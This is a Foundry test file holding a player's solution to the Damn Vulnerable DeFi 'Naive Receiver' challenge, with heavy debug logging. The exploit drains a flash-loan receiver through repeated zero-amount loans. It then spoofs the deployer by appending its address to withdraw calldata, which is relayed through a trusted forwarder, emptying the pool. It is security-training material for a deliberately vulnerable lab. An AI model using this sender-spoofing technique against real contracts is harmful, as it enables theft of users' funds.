// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        // before executing exploit/multicall
uint256 prePlayer = weth.balanceOf(player);
uint256 preReceiver = weth.balanceOf(address(receiver));
uint256 prePool = weth.balanceOf(address(pool));
uint256 preRecovery = weth.balanceOf(recovery);
console.log("=== BEFORE exploit ===");
console.log("player weth:", prePlayer);
console.log("receiver weth:", preReceiver);
console.log("pool weth:", prePool);
console.log("recovery weth:", preRecovery);
console.log("");
console.log("");
console.log("");

        // NOTE: Create bytes[] memory called callDatas that takes 11 arguments
        bytes[] memory callDatas = new bytes[](11);
        
        // NOTE: Create batch of callDatas transactions with 9 flashloan and 1 withdraw
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan, 
                (receiver, address(weth), 0, "0x")
            );

            // LOG: show basic info for each flashLoan entry
        console.log("callDatas[%s] length (bytes):", i, callDatas[i].length);

        // print first 32 bytes (contains selector + part of first arg)
        bytes memory tmp = callDatas[i]; // <-- copy to local so assembly can access it
        bytes32 firstWord;
        assembly { firstWord := mload(add(tmp, 32)) } // load the first 32-byte word of data
        console.logBytes32(firstWord);

        // print full calldata as bytes (if not too long)
        console.log("callDatas[%s] full bytes:", i);
        console.logBytes(callDatas[i]);
        }

        // NOTE: encodeCall = proper calldata 
        //       encodePacked = only combine bytes 
        // exp: 00f714ce [amount padded 32B] [recovery padded 32B] [deployer padded 32B]
        // actual call data: 4 (from NaiveRecieverPool.withdraw) + 32 + 32 + 32 (from encodePacked (deployer bytes32)) = 100 bytes
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw, 
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer))) // smuggle payload
        );

            // LOG: inspect the 11th entry (the one with smuggled payload)
    console.log("=== inspect callDatas[10] (withdraw + smuggled deployer) ===");
    console.log("callDatas[10] length (bytes):", callDatas[10].length);

    // first 32 bytes contains selector (first 4 bytes) + padding; show it
    bytes memory tmp10 = callDatas[10]; // <-- local copy for assembly
    bytes32 firstWord10;
    assembly { firstWord10 := mload(add(tmp10, 32)) }
    console.log("first 32 bytes (callDatas[10]):");
    console.logBytes32(firstWord10);

    // show full callDatas[10]
    console.log("callDatas[10] full bytes:");
    console.logBytes(callDatas[10]);

    // show the last 32-byte word (this should be the smuggled deployer)
    uint len10 = tmp10.length;
    bytes32 lastWord10;
    // pointer to data area = tmp10 + 32; last word starts at data + (len - 32)
    assembly {
        lastWord10 := mload(add(add(tmp10, 32), sub(len10, 32)))
    }
    console.log("last 32 bytes (should be deployer as bytes32):");
    console.logBytes32(lastWord10);
    
    // NOTE: builds callData that encodes multicall invocation for the pool contract
    bytes memory callData; 
    callData = abi.encodeCall(pool.multicall, callDatas); // ===============

    // LOG: inspect the multicall encoded bytes
    console.log("=== multicall callData ===");
    console.log("callData length (bytes):", callData.length);

    // show first 32 bytes of multicall (selector + head)
    bytes memory cd = callData; // <-- local copy for assembly
    bytes32 multicallFirst;
    assembly { multicallFirst := mload(add(cd, 32)) }
    console.log("multicall first 32 bytes (selector + head):");
    console.logBytes32(multicallFirst);

    console.log("multicall full bytes (truncated if long):");
    console.logBytes(callData);

        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );

        // NOTE: 
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01", // the fixed prefix defined by EIP-191/EIP-712 used 
                //             before hashing domain & struct hash. It prevents certain 
                //             signature replay or ambiguity.
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // LOG: show Request fields and hashes
        console.log("");
        console.log("");
        console.log("");
        console.log("=== Forwarder Request struct fields ===");
        console.log("from (player):");
        console.logAddress(request.from);
        console.log("to (pool):");
        console.logAddress(request.target);
        console.log("value:");
        console.logUint(uint256(request.value));
        console.log("gas:");
        console.logUint(request.gas);
        console.log("nonce:");
        console.logUint(request.nonce);
        console.log("deadline (seconds):");
        console.logUint(request.deadline);
        console.log("request.data length:");
        console.logUint(request.data.length);

        bytes32 dataHash = forwarder.getDataHash(request);
        console.log("forwarder.getDataHash(request) (bytes32):");
        console.logBytes32(dataHash);

        bytes32 domainSep = forwarder.domainSeparator();
        console.log("forwarder.domainSeparator() (bytes32):");
        console.logBytes32(domainSep);

        console.log("requestHash (digest to sign):");
        console.logBytes32(requestHash);

        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        console.log("signature r:");
        console.logBytes32(r);
        console.log("signature s:");
        console.logBytes32(s);
        console.log("signature v:");
        console.logUint(v);
        console.log("signature full bytes:");
        console.logBytes(signature);

        forwarder.execute(request, signature);

        console.log("forwarder.execute completed.");

    // after executing exploit/multicall
uint256 postPlayer = weth.balanceOf(player);
uint256 postReceiver = weth.balanceOf(address(receiver));
uint256 postPool = weth.balanceOf(address(pool));
uint256 postRecovery = weth.balanceOf(recovery);
console.log("");
console.log("");
console.log("");
console.log("=== AFTER exploit ===");
console.log("player weth:", postPlayer);
console.log("receiver weth:", postReceiver);
console.log("pool weth:", postPool);
console.log("recovery weth:", postRecovery);

// print deltas to make it easy to read

    }

function _lessIteration() public {
// --- BEFORE: print balances ---
    console.log("=== BEFORE exploit ===");
    console.log("player weth:", weth.balanceOf(player));
    console.log("receiver weth:", weth.balanceOf(address(receiver)));
    console.log("pool weth:", weth.balanceOf(address(pool)));
    console.log("recovery weth:", weth.balanceOf(recovery));
    console.log("");

    // --- Build single withdraw call and append deployer as last 20 bytes ---
    bytes[] memory calls = new bytes[](1);
    // amount to withdraw: use entire pool WETH balance (deployer deposited initial funds)
    uint256 depositAmount = weth.balanceOf(address(pool));

    // Create withdraw calldata and append exact 20-byte deployer address so the pool sees it as the tail
    calls[0] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (depositAmount, payable(recovery))),
        bytes20(deployer) // append exactly 20 bytes (no padding) -> becomes last 20 bytes of calldata
    );

    // Encode the multicall calldata for pool.multicall(calls)
    bytes memory callData = abi.encodeCall(pool.multicall, (calls));

    // --- DEBUG: read and print the last 32 bytes of callData ---
    bytes32 last32;
    uint256 len = callData.length;
    assembly {
        // load the final 32-byte word of the calldata buffer
        last32 := mload(add(add(callData, 32), sub(len, 32)))
    }
    console.log("last 32 bytes (hex):");
    console.logBytes32(last32);

    // --- CORRECT extraction: convert high-order 20 bytes of last32 into an address ---
    // the appended bytes20(deployer) occupy the most-significant 20 bytes of last32
    address last20Address = address(uint160(uint256(last32) >> 96)); // shift right 12 bytes (96 bits)
    console.log("last20 (as address):");
    console.logAddress(last20Address);
    console.log("expected deployer:");
    console.logAddress(deployer);

    // --- Build EIP-712 forwarder request and sign it ---
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        callData,
        1 days
    );

    bytes32 requestHash = keccak256(
        abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    // --- Execute via trusted forwarder (this is the exploit step) ---
    forwarder.execute(request, signature);

    // --- AFTER: print balances to verify drain ---
    console.log("");
    console.log("=== AFTER exploit ===");
    console.log("player weth:", weth.balanceOf(player));
    console.log("receiver weth:", weth.balanceOf(address(receiver)));
    console.log("pool weth:", weth.balanceOf(address(pool)));
    console.log("recovery weth:", weth.balanceOf(recovery));

    // Optional sanity asserts (uncomment if you want strict test failure on mismatch)
    // assertEq(weth.balanceOf(address(pool)), 0, "Pool not drained");
    // assertEq(weth.balanceOf(recovery), depositAmount, "Recovery did not receive funds");
}

function test_lessIteration() public {
    _lessIteration();
}

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
    // Player must have executed two or less transactions
    // (we also print the nonce for debugging)
    console.log("=== _isSolved diagnostics ===");
    console.log("player nonce (vm.getNonce):");
    console.logUint(vm.getNonce(player));
    // The flashloan receiver contract has been emptied
    // show balances for quick debugging
    console.log("weth.balanceOf(player):");
    console.logUint(weth.balanceOf(player));
    console.log("weth.balanceOf(address(receiver)):");
    console.logUint(weth.balanceOf(address(receiver)));
    // Pool is empty too
    console.log("weth.balanceOf(address(pool)):");
    console.logUint(weth.balanceOf(address(pool)));
    // All funds sent to recovery account
    console.log("weth.balanceOf(recovery):");
    console.logUint(weth.balanceOf(recovery));
    console.log("expected total (WETH_IN_POOL + WETH_IN_RECEIVER):");
    console.logUint(WETH_IN_POOL + WETH_IN_RECEIVER);

    // Player must have executed two or less transactions
    assertLe(vm.getNonce(player), 2);

    // The flashloan receiver contract has been emptied
    assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

    // Pool is empty too
    assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

    // All funds sent to recovery account
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
}

}
